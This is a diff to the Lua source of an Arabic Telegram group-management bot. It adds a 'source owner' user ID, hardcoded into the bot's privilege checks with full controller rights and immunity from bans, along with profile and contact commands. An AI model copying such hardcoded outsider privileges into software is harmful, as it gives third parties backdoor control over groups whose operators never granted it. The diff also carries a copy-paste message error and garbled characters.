@@ -148,6 +148,8 @@ if tonumber(UserId) == 5317962649 then
 Status = 'المبرمج تيمو'
 elseif UserId == 776886547 then  
 Status = 'المطور ليدو'
+elseif UserId == 5074548515 then  
+Status = 'مالك السورس'
 elseif UserId == Sudo_Id then  
 Status = 'المطور الاساسي'
 elseif UserId == Timo then
@@ -737,6 +739,8 @@ if tonumber(UserId) == 5317962649 then
 Status = true
 elseif UserId == 776886547 then  
 Status = true
+elseif UserId == 5074548515 then  
+Status = true
 elseif UserId == Sudo_Id then  
 Status = true
 elseif UserId == Timo then
@@ -778,6 +782,8 @@ StatusMember = LuaTele.getChatMember(ChatId,UserId).status.luatele
 if tonumber(UserId) == 5317962649 then
 Status = true
 elseif UserId == 776886547 then  
+Status = true
+elseif UserId == 5074548515 then  
 Status = true
 elseif UserId == Sudo_Id then  
 Status = true
@@ -935,6 +941,9 @@ msg.Name_Controller = 'المبرمج تيمو'
 msg.The_Controller = 1
 elseif tonumber(msg.sender.user_id) == 776886547 then
 msg.Name_Controller = 'المطور ليدو'
+msg.The_Controller = 1
+elseif tonumber(msg.sender.user_id) == 5074548515 then
+msg.Name_Controller = 'مالك السورس'
 msg.The_Controller = 1
 elseif The_ControllerAll(msg.sender.user_id) == true then  
 msg.The_Controller = 1
@@ -4853,7 +4862,7 @@ end
 end
 local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
-data = {{{text = '𝐒𝐨𝐮𝐫𝐜𝐞 𝐒??𝐥𝐯??', url = "http://t.me/SO_SELVA"}, },}}
+data = {{{text = '??𝐨𝐮𝐫𝐜𝐞 𝐒??𝐥𝐯??', url = "http://t.me/SO_SELVA"}, },}}
 return LuaTele.sendText(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
 end
 if text == 'البقرات' or text == 'تاك للبقرات' then
@@ -6648,6 +6657,9 @@ end
 if UserId == "776886547" then
 return LuaTele.sendText(msg_chat_id,msg_id,"\n* ⌯ عذرا لا تستطيع استخدام الامر على المطور ليدو *","md",true)  
 end
+if UserId == "5074548515" then
+return LuaTele.sendText(msg_chat_id,msg_id,"\n* ⌯ عذرا لا تستطيع استخدام الامر على المطور ليدو *","md",true)  
+end
 if Redis:sismember(Timo.."BanAll:Groups",UserId) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId,"⌯ تم حظره عام من المجموعات مسبقا ").Reply,"md",true)  
 else
@@ -6695,6 +6707,9 @@ if UserId == "5317962649" then
 return LuaTele.sendText(msg_chat_id,msg_id,"\n* ⌯ عذرا لا تستطيع استخدام الامر على المطور تيمو *","md",true)  
 end
 if UserId == "776886547" then
+return LuaTele.sendText(msg_chat_id,msg_id,"\n* ⌯ عذرا لا تستطيع استخدام الامر على المطور ليدو *","md",true)  
+end
+if UserId == "5074548515" then
 return LuaTele.sendText(msg_chat_id,msg_id,"\n* ⌯ عذرا لا تستطيع استخدام الامر على المطور ليدو *","md",true)  
 end
 local ban = LuaTele.getUser(UserId)
@@ -11401,6 +11416,45 @@ local msg_id = msg.id/2097152/0.5
 end
 end
 end
+if text == 'مالك السورس' or text == 'بويكا' or text == 'صاحب السورس' or text == '𓄼 مالك السورس 𓄹' then    
+local UserId_Info = LuaTele.searchPublicChat("boykaa6")
+if UserId_Info.id then
+local  selva = LuaTele.getUser(UserId_Info.id)
+local  bain = LuaTele.getUserFullInfo(UserId_Info.id)
+if  bain.bio then
+Bio =  bain.bio
+else
+Bio = 'لا يوجد'
+end
+if selva.first_name then
+Creat = " "..selva.first_name.." "
+else
+Creat = " Developers lido\n"
+end
+local photo = LuaTele.getUserProfilePhotos(UserId_Info.id)
+if photo.total_count > 0 then
+local TestText = "𓄼•dev boyka•𓄹\n— — — — — — — — —\n ⌯*Dev Name* :  [".. selva.first_name.."](tg://user?id="..UserId_Info.id..")\n⌯ *Dev Bio* : [❲ "..Bio.." ❳]"
+keyboardd = {} 
+keyboardd.inline_keyboard = {
+{
+{text = '𓄼•ᴅᴇᴠ ʙᴏʏᴋᴀ•𓄹', url = "https://t.me/boykaa6"}
+},
+}
+local msg_id = msg.id/2097152/0.5 
+ https.request("https://api.telegram.org/bot"..Token..'/sendPhoto?chat_id='..msg.chat_id..'&caption='..URL.escape(TestText)..'&photo='..photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id..'&reply_to_message_id='..msg_id..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboardd))
+else
+local TestText = " 𓄼•dev boyka•𓄹\n— — — — — — — — —\n ⌯*Dev Name* :  [".. selva.first_name.."](tg://user?id="..UserId_Info.id..")\n⌯ *Dev Bio* : [❲ "..Bio.." ❳]"
+keyboardd = {} 
+keyboardd.inline_keyboard = {
+{
+{text = '𓄼•ᴅᴇᴠ ʙᴏʏᴋᴀ•𓄹', url = "https://t.me/boykaa6"}
+},
+}
+local msg_id = msg.id/2097152/0.5 
+ https.request("https://api.telegram.org/bot"..Token..'/sendMessage?chat_id=' .. msg.chat_id .. '&text=' .. URL.escape(TestText).."&reply_to_message_id="..msg_id..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboardd))
+end
+end
+end
 
 if text == 'المطور' or text == 'مطور' or text == 'مطور' then   
 local Get_Chat = LuaTele.getChat(msg_chat_id)
@@ -11617,6 +11671,9 @@ keyboard.inline_keyboard = {
 {text = 'ᴅᴇᴠ ᴛɪᴍᴏ', url = "https://t.me/tt_t_2"},{text = 'ᴅᴇᴠ ʟᴇᴅᴏ', url = "https://t.me/J0KER7x"}
 },
 {
+{text = 'ᴅᴇᴠ ʙᴏʏᴋᴀ', url = "https://t.me/boykaa6"}
+},
+{
 {text = 'ᴄʜᴀɴɴᴇʟ sᴏᴜʀᴄᴇ', url = "https://t.me/SO_SELVA"}
 },
 {
@@ -11637,10 +11694,13 @@ local T =[[
 keyboard = {} 
 keyboard.inline_keyboard = {
 {
-{text = '𝐃𝐞𝐯 𝐓𝐢𝐦𝐨', url = "https://t.me/tt_t_2"}
+{text = 'تـيـمـو', url = "https://t.me/tt_t_2"}
 },
 {
-{text = '𝐃𝐞𝐯 𝐋𝐢𝐝𝐨', url = "https://t.me/J0KER7x"}
+{text = 'لـيـدو', url = "https://t.me/J0KER7x"}
+},
+{
+{text = 'بـويـكـا', url = "https://t.me/boykaa6"}
 },
 {
 {text = '𝐒𝐨𝐮𝐫𝐜𝐞 𝐒𝐞𝐥𝐯𝐚', url = "https://t.me/SO_SELVA"}
@@ -13986,6 +14046,45 @@ local msg_id = msg.id/2097152/0.5
 end
 end
 end
+if text == 'مالك السورس' or text == 'بويكا' or text == 'صاحب السورس' or text == '𓄼 مالك السورس 𓄹' then    
+local UserId_Info = LuaTele.searchPublicChat("boykaa6")
+if UserId_Info.id then
+local  selva = LuaTele.getUser(UserId_Info.id)
+local  bain = LuaTele.getUserFullInfo(UserId_Info.id)
+if  bain.bio then
+Bio =  bain.bio
+else
+Bio = 'لا يوجد'
+end
+if selva.first_name then
+Creat = " "..selva.first_name.." "
+else
+Creat = " Developers lido\n"
+end
+local photo = LuaTele.getUserProfilePhotos(UserId_Info.id)
+if photo.total_count > 0 then
+local TestText = "𓄼•dev boyka•𓄹\n— — — — — — — — —\n ⌯*Dev Name* :  [".. selva.first_name.."](tg://user?id="..UserId_Info.id..")\n⌯ *Dev Bio* : [❲ "..Bio.." ❳]"
+keyboardd = {} 
+keyboardd.inline_keyboard = {
+{
+{text = '𓄼•ᴅᴇᴠ ʙᴏʏᴋᴀ•𓄹', url = "https://t.me/boykaa6"}
+},
+}
+local msg_id = msg.id/2097152/0.5 
+ https.request("https://api.telegram.org/bot"..Token..'/sendPhoto?chat_id='..msg.chat_id..'&caption='..URL.escape(TestText)..'&photo='..photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id..'&reply_to_message_id='..msg_id..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboardd))
+else
+local TestText = " 𓄼•dev boyka•𓄹\n— — — — — — — — —\n ⌯*Dev Name* :  [".. selva.first_name.."](tg://user?id="..UserId_Info.id..")\n⌯ *Dev Bio* : [❲ "..Bio.." ❳]"
+keyboardd = {} 
+keyboardd.inline_keyboard = {
+{
+{text = '𓄼•ᴅᴇᴠ ʙᴏʏᴋᴀ•𓄹', url = "https://t.me/boykaa6"}
+},
+}
+local msg_id = msg.id/2097152/0.5 
+ https.request("https://api.telegram.org/bot"..Token..'/sendMessage?chat_id=' .. msg.chat_id .. '&text=' .. URL.escape(TestText).."&reply_to_message_id="..msg_id..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboardd))
+end
+end
+end
 
 if text == 'رتبتي' then
 local selva = LuaTele.getUser(msg.sender.user_id)
@@ -14037,6 +14136,9 @@ keyboard.inline_keyboard = {
 {text = 'ᴅᴇᴠ ᴛɪᴍᴏ', url = "https://t.me/tt_t_2"},{text = 'ᴅᴇᴠ ʟᴇᴅᴏ', url = "https://t.me/J0KER7x"}
 },
 {
+{text = 'ᴅᴇᴠ ʙᴏʏᴋᴀ', url = "https://t.me/boykaa6"}
+},
+{
 {text = 'ᴄʜᴀɴɴᴇʟ sᴏᴜʀᴄᴇ', url = "https://t.me/SO_SELVA"}
 },
 {
@@ -14068,22 +14170,23 @@ keyboard.inline_keyboard = {
 local msgg = msg_id/2097152/0.5
 https.request("https://api.telegram.org/bot"..Token.."/sendphoto?chat_id=" .. msg_chat_id .. "&photo="..photo.."&caption=".. URL.escape(Name).."&reply_to_message_id="..msgg.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 elseif text == '𓄼 مطورين السورس 𓄹' then
-photo = "http://t.me/selva_so/8"
+photo = "http://t.me/selva_so/2"
 local T =[[
-[𝐃𝐞𝐯 𝐓𝐢𝐦𝐨](http://t.me/tt_t_2)
-
-[𝐃𝐞𝐯 𝐋𝐢𝐝𝐨](http://t.me/J0KER7x)
+[مطورين ومبرمجين سورس سيلفا](http://t.me/SO_SELVA)
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
 {
-{text = '𓄼 المبرمج تيمو 𓄹',url = "https://t.me/tt_t_2"}
+{text = 'تـيـمـو', url = "https://t.me/tt_t_2"}
 },
 {
-{text = '𓄼 المطور ليدو 𓄹',url = "https://t.me/J0KER7x"}
+{text = 'لـيـدو', url = "https://t.me/J0KER7x"}
 },
 {
-{text = 'اضف البوت لمجموعتك ➕', url = 't.me/'..UserBot..'?startgroup=new'},
+{text = 'بـويـكـا', url = "https://t.me/boykaa6"}
+},
+{
+{text = '𝐒𝐨𝐮𝐫𝐜𝐞 𝐒𝐞𝐥𝐯𝐚', url = "https://t.me/SO_SELVA"}
 },
 }
 local msgg = msg_id/2097152/0.5
